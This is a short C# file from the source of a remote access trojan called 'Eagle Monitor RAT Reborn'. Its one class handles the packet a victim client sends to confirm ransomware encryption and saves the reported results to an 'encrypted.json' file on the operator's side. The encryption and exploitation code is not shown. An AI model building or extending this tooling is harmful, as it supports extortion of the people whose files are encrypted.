using Eagle_Monitor_RAT_Reborn.Network;
using PacketLib.Packet;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class RansomareEncryptionConfirmationPacketHandler
    {
        public RansomareEncryptionConfirmationPacketHandler(RansomwareConfirmationPacket packet) : base()
        {
            System.IO.File.WriteAllText(ClientHandler.ClientHandlersList[packet.baseIp].clientPath + "\\Ransomware\\encrypted.json", packet.results);
        }
    }
}
